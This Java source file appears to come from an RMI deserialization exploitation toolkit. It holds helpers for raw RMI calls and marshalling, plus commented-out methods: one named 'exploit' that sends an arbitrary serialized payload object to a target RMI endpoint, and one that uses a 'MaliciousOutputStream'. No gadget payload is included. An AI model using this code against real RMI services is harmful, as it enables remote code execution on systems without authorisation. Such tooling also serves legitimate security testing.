package xyz.eki.marshalexp.rmi.networking;

import javassist.CtClass;
import javassist.CtPrimitiveType;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMISocketFactory;
import java.rmi.server.RemoteRef;

/**
 * 用来表示RMI服务的入口点。可以用来进行低层次的RMI交互
 */
public class RMIEndpoint {
    public String host;
    public int port;
    protected RMIClientSocketFactory csf;


    public RMIEndpoint(String host, int port){
        this.host = host;
        this.port = port;

        //TODO
        this.csf = RMISocketFactory.getDefaultSocketFactory();
    }

    /**
     * 根据ObjID获取远程对象
     *
     * @param objID identifies the targeted remote object on the server side
     * @return newly constructed RemoteRef
     */
    public RemoteRef getRemoteRef(ObjID objID)
    {
        Endpoint endpoint = new TCPEndpoint(host, port, csf, null);
        return new UnicastRef(new LiveRef(objID, endpoint, false));
    }

    /**
     * Marshals the specified object value to the corresponding type and writes it to the specified
     * output stream. This is basically a copy from the default RMI implementation of this function.
     * The type values are obtained by the method signature and the object values come from the argument
     * array.
     *
     * @param type data type to marshal to
     * @param value object to be marshalled
     * @param out output stream to marshal to
     * @throws IOException in case of a failing write operation to the stream
     */
    private static void marshalValue(Class<?> type, Object value, ObjectOutput out) throws IOException
    {
        if (type.isPrimitive()) {
            if (type == int.class) {
                out.writeInt(((Integer) value).intValue());
            } else if (type == boolean.class) {
                out.writeBoolean(((Boolean) value).booleanValue());
            } else if (type == byte.class) {
                out.writeByte(((Byte) value).byteValue());
            } else if (type == char.class) {
                out.writeChar(((Character) value).charValue());
            } else if (type == short.class) {
                out.writeShort(((Short) value).shortValue());
            } else if (type == long.class) {
                out.writeLong(((Long) value).longValue());
            } else if (type == float.class) {
                out.writeFloat(((Float) value).floatValue());
            } else if (type == double.class) {
                out.writeDouble(((Double) value).doubleValue());
            } else {
                throw new Error("Unrecognized primitive type: " + type);
            }
        } else {
            out.writeObject(value);
        }
    }

    /**
     * Unmarshals an object from the specified ObjectInput according to the data type specified
     * in the type parameter. This is required to read the result of RMI calls, as different types
     * are written differently to the ObjectInput by the RMI server. The expected type is taken from
     * the return value of the method signature.
     *
     * @param type data type that is expected from the stream
     * @param in ObjectInput to read from.
     * @return unmarshalled object
     * @throws IOException if reading the ObjectInput fails
     * @throws ClassNotFoundException if the read in class is unknown.
     */
    private static Object unmarshalValue(CtClass type, ObjectInput in) throws IOException, ClassNotFoundException
    {
        if (type.isPrimitive()) {
            if (type == CtPrimitiveType.intType) {
                return Integer.valueOf(in.readInt());
            } else if (type == CtPrimitiveType.booleanType) {
                return Boolean.valueOf(in.readBoolean());
            } else if (type == CtPrimitiveType.byteType) {
                return Byte.valueOf(in.readByte());
            } else if (type == CtPrimitiveType.charType) {
                return Character.valueOf(in.readChar());
            } else if (type == CtPrimitiveType.shortType) {
                return Short.valueOf(in.readShort());
            } else if (type == CtPrimitiveType.longType) {
                return Long.valueOf(in.readLong());
            } else if (type == CtPrimitiveType.floatType) {
                return Float.valueOf(in.readFloat());
            } else if (type == CtPrimitiveType.doubleType) {
                return Double.valueOf(in.readDouble());
            } else {
                throw new Error("Unrecognized primitive type: " + type);
            }
        } else {
            return in.readObject();
        }
    }

//    //|magic|version|protocol|opType|objid|opNum|methodHash|methodArgs|
//    public rawStubCall(ObjID objID, int callID, long methodHash, MethodArguments callArguments, boolean locationStream, RemoteRef remoteRef, CtClass rtype){
//
//        if(remoteRef == null) {
//            remoteRef = this.getRemoteRef(objID);
//        }
//
//        StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, callID, methodHash);
//
//        try {
//            ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
//            if(locationStream)
//                out = new MaliciousOutputStream(out);
//
//            for(Pair<Object,Class> p : callArguments) {
//                marshalValue(p.right(), p.left(), out);
//            }
//
//        } catch(java.io.IOException e) {
//            throw new java.rmi.MarshalException("error marshalling arguments", e);
//        }
//
//        remoteRef.invoke(call);
//
//        if(rtype != null && rtype != CtPrimitiveType.voidType && PluginSystem.hasResponseHandler()) {
//
//            try {
//                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
//                Object returnValue = unmarshalValue(rtype, in);
//                PluginSystem.handleResponse(returnValue);
//
//            } catch( IOException | ClassNotFoundException e ) {
//                ((StreamRemoteCall)call).discardPendingRefs();
//                throw new java.rmi.UnmarshalException("error unmarshalling return", e);
//
//            } finally {
//                try {
//                    remoteRef.done(call);
//                } catch (IOException e) {
//                    ExceptionHandler.unexpectedException(e, "done", "operation", true);
//                }
//            }
//        }
//
//        remoteRef.done(call);
//    }

//    //|magic|version|protocol|opType|objid|opNum|methodHash|methodArgs|
//    public static byte[] exploit (String hostname, int port, Object payloadObject, ObjID objid, int opnum, Long hash) throws Exception {
//        Socket s = null;
//        DataOutputStream dos = null;
//        try {
//            s = SocketFactory.getDefault().createSocket(hostname, port);
//            s.setKeepAlive(true);
//            s.setTcpNoDelay(true);
//
//            OutputStream os = s.getOutputStream();
//            dos = new DataOutputStream(os);
//
//            dos.writeInt(TransportConstants.Magic);
//            dos.writeShort(TransportConstants.Version);
//            dos.writeByte(TransportConstants.SingleOpProtocol);
//
//            dos.write(TransportConstants.Call);
//
//            final ObjectOutputStream objOut = new MarshalOutputStream(dos);
//
//
//            objid.write(objOut); //Objid
//
//            objOut.writeInt(opnum); // opnum
//            objOut.writeLong(hash); // hash
//
//            objOut.writeObject(payloadObject);
//
//            os.flush();
//
//            ByteArrayOutputStream bout = new ByteArrayOutputStream();
//            InputStream ins = s.getInputStream();
//            byte [] buf = new byte[1];
//
//            while(ins.read(buf) != -1){
//                bout.write(buf);
//            }
//
//            byte [] returnData = bout.toByteArray();
//            return returnData;
//        } finally {
//            if (dos != null) {
//                dos.close();
//            }
//            if (s != null) {
//                s.close();
//            }
//        }
//    }
}
